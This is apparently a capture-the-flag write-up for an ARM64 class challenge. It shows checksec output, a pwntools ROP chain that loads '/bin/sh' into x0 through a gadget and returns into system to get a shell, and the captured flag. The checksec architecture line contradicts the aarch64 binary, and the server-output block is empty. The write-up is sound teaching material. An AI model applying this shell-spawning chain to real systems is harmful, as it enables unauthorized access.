# AARCH64:Solution

Even if we hadn't been told this was an arm binary, it was easy to figure it out.
```
file chal.bin 
chal.bin: ELF 64-bit LSB executable, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, BuildID[sha1]=aae8ada57f8c7c8ca11580f143633b180affbdbd, for GNU/Linux 3.7.0, not stripped
```

The binary is compiled with NX and Partial RELRO.
```
checksec chal.bin  
[*] '/root/workspace/vuln/aarch64/chal/chal.bin'
    Arch:     amd64-64-little                                                  
    RELRO:    Partial RELRO                                                    
    Stack:    No canary found                                                 
    NX:       NX enabled                                                       
    PIE:      No PIE (0x400000)
```

This is the output from connecting the the remote server
```
```


To find the overflow, I took the easy way and spammed "A"s until the buffer was overflowed. 

To get a shell we need system and /bin/sh. I could find these manually with rabin2. Ex:
```
rabin2 -zz chal.bin | grep bin
34  0x00000fb8 0x00400fb8 81  82   .rodata   ascii   -------------------------------------------------------------------------/bin/sh\n
```

Pwntools is super cool though and since /bin/sh and system are in the binary I can just find them by their name with pwntools and less manual effort.
```
chain += p64(next(e.search(b'/bin/sh')))
chain += p64(e.sym['system']) 
```

This function can be used to populate the registers we need for the exploit, found in binja ([weird machine](https://en.wikipedia.org/wiki/Weird_machine)).
```
sub_31337:
00400854  ldp     x0, x1, [sp], #0x10 {arg1} {arg2}
00400858  ldp     x29, x30, [sp], #0x10 {arg3} {arg_18}
0040085c  ret     
```

We only have one argument to get into the gadget: /bin/sh into the first argument (x0) and fill x1 with 0. Then we have the Frame Pointer and Link Register.
We don't need anything for the frame pointer so we can set that to 0, then we use the link register, which usually has the return address to call system.
```
chain += p64(0x400854)                          # weird machine gadget -> x0, x1, x29, x30

chain += p64(next(e.search(b'/bin/sh')))        # x0 ->find /bin/sh
chain += p64(0)                                 # x1
chain += p64(0)                                 # x29
chain += p64(e.sym['system'])                   # x30 -> call system
```

Don't forget to put the chain in the sendline and spend an hour troubleshooting the chain before you realize like me, then send the chain and get the flag!
```
flag{U_kn0w_you_G0t_1t}
```

Resources:
* Class slides
* Chandler
* https://developer.arm.com/documentation/dui0801/a/Overview-of-AArch64-state/Link-registers
* https://en.wikipedia.org/wiki/Weird_machine
